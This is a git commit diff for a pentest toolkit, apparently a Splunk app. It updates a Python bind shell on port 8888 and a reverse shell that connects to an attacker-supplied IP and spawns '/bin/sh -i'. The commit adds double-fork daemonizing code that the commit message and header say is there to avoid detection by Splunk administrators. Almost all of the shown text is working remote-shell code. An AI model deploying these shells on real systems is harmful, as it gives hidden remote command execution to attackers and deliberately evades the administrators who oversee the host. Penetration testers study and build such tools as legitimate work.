7f1b4659e53437100deda170d4a58cd443067b5f
Ryan Hays <hays.ryan@gmail.com>
2016-10-02 16:35:41 -0400

    Updated the shells to fork themselves to avoid detection from Splunk Admins.

--- bin/bind_shell.py
+++ bin/bind_shell.py
@@ -11,12 +11,60 @@
 #**************************************************************************#
 
 
-import sys
-import socket
 import os
-import thread
+import socket
 import subprocess
+import sys
+import thread
 import urllib2
+
+
+UMASK = 0
+WORKDIR = "/"
+MAXFD = 1024
+
+if hasattr(os, "devnull"):
+    REDIRECT_TO = os.devnull
+else:
+    REDIRECT_TO = "/dev/null"
+
+
+def createdaemon():
+    try:
+        pid = os.fork()
+    except OSError, e:
+        raise Exception, "%s [%d]" % (e.strerror, e.errno)
+
+    if pid == 0:  # The first child.
+        os.setsid()
+        try:
+            pid = os.fork()  # Fork a second child.
+        except OSError, e:
+            raise Exception, "%s [%d]" % (e.strerror, e.errno)
+
+        if pid == 0:  # The second child.
+            os.chdir(WORKDIR)
+            os.umask(UMASK)
+        else:
+            os._exit(0)  # Exit parent (the first child) of the second child.
+    else:
+        os._exit(0)  # Exit parent of the first child.
+
+    import resource  # Resource usage information.
+    maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
+    if maxfd == resource.RLIM_INFINITY:
+        maxfd = MAXFD
+
+    for fd in range(0, maxfd):
+        try:
+            os.close(fd)
+        except OSError:  # ERROR, fd wasn't open to begin with (ignored)
+            pass
+    os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
+    os.dup2(0, 1)  # standard output (1)
+    os.dup2(0, 2)  # standard error (2)
+
+    return (0)
 
 
 def connection(conn):
@@ -48,28 +96,45 @@ def connection(conn):
                     stdoutput = proc.stdout.read() + proc.stderr.read()
                     conn.send(stdoutput)
 
+if __name__ == "__main__":
+    retCode = createdaemon()
 
-while True:
-    try:
-            s = socket.socket()
-            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+    procParams = """
+   return code = %s
+   process ID = %s
+   parent process ID = %s
+   process group ID = %s
+   session ID = %s
+   user ID = %s
+   effective user ID = %s
+   real group ID = %s
+   effective group ID = %s
+   """ % (retCode, os.getpid(), os.getppid(), os.getpgrp(), os.getsid(0),
+          os.getuid(), os.geteuid(), os.getgid(), os.getegid())
 
-            try:
-                s.bind(('', int(sys.argv[1])))
-            except IndexError:
-                s.bind(('', 8888))
-            s.listen(5)
+    while True:
+        try:
+                s = socket.socket()
+                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-            while True:
-                    s.settimeout(2)
-                    try:
-                            conn, addr = s.accept()
+                try:
+                    s.bind(('', int(sys.argv[1])))
+                except IndexError:
+                    s.bind(('', 8888))
+                s.listen(5)
 
-                    except socket.timeout:
-                            continue
+                while True:
+                        s.settimeout(2)
+                        try:
+                                conn, addr = s.accept()
 
-                    if (conn):
-                            s.settimeout(None)
-                            thread.start_new_thread(connection, (conn,))
-    except:
-            pass
+                        except socket.timeout:
+                                continue
+
+                        if (conn):
+                                s.settimeout(None)
+                                thread.start_new_thread(connection, (conn,))
+        except:
+                pass
+
+    sys.exit(retCode)
--- bin/rev_shell.py
+++ bin/rev_shell.py
@@ -3,22 +3,106 @@
 
 #**************************************************************************#
 #  Filename: py_rev_shel.py             (Created: 2016-08-18)              #
-#                                       (Updated: XXXX-XX-XX)              #
+#                                       (Updated: 2016-10-02)              #
 #  Info:                                                                   #
-#    TBG Security Python Reverse Shell for pentests                        #
+#    TBG Security Python Reverse Shell for pentests.                       #
+#       This will fork itself and detach from the parent Splunk process    #
+#       so that Splunk does not hang while the reverse shell is running.   #
+#       This also helps to avoid detection by Splunk admins.               #
 #  Author:                                                                 #
 #    Ryan Hays                                                             #
 #**************************************************************************#
 
+import os
 import socket
 import subprocess
-import os
+import sys
 
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.0.0.1", 1234))
 
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
+UMASK = 0
+WORKDIR = "/"
+MAXFD = 1024
 
-p=subprocess.call(["/bin/sh", "-i"])
+if hasattr(os, "devnull"):
+    REDIRECT_TO = os.devnull
+else:
+    REDIRECT_TO = "/dev/null"
+
+
+def createdaemon():
+    try:
+        pid = os.fork()
+    except OSError, e:
+        raise Exception, "%s [%d]" % (e.strerror, e.errno)
+
+    if pid == 0:  # The first child.
+        os.setsid()
+        try:
+            pid = os.fork()  # Fork a second child.
+        except OSError, e:
+            raise Exception, "%s [%d]" % (e.strerror, e.errno)
+
+        if pid == 0:  # The second child.
+            os.chdir(WORKDIR)
+            os.umask(UMASK)
+        else:
+            os._exit(0)  # Exit parent (the first child) of the second child.
+    else:
+        os._exit(0)  # Exit parent of the first child.
+
+    import resource  # Resource usage information.
+    maxfd = resource.getrlimit(resource.RLIMIT_NOFILE)[1]
+    if maxfd == resource.RLIM_INFINITY:
+        maxfd = MAXFD
+
+    for fd in range(0, maxfd):
+        try:
+            os.close(fd)
+        except OSError:  # ERROR, fd wasn't open to begin with (ignored)
+            pass
+    os.open(REDIRECT_TO, os.O_RDWR)  # standard input (0)
+    os.dup2(0, 1)  # standard output (1)
+    os.dup2(0, 2)  # standard error (2)
+
+    return (0)
+
+
+if __name__ == "__main__":
+    retCode = createdaemon()
+
+    procParams = """
+   return code = %s
+   process ID = %s
+   parent process ID = %s
+   process group ID = %s
+   session ID = %s
+   user ID = %s
+   effective user ID = %s
+   real group ID = %s
+   effective group ID = %s
+   """ % (retCode, os.getpid(), os.getppid(), os.getpgrp(), os.getsid(0),
+          os.getuid(), os.geteuid(), os.getgid(), os.getegid())
+
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        connect_to_ip = sys.argv[1]
+    except IndexError:
+        sys.exit(1)
+
+    try:
+        connect_to_port = int(sys.argv[2])
+    except IndexError:
+        connect_to_port = 1234
+
+    try:
+        s.connect((connect_to_ip, connect_to_port))
+    except socket.error:
+        sys.exit(1)
+
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+
+    p = subprocess.call(["/bin/sh", "-i"])
+
+    sys.exit(retCode)
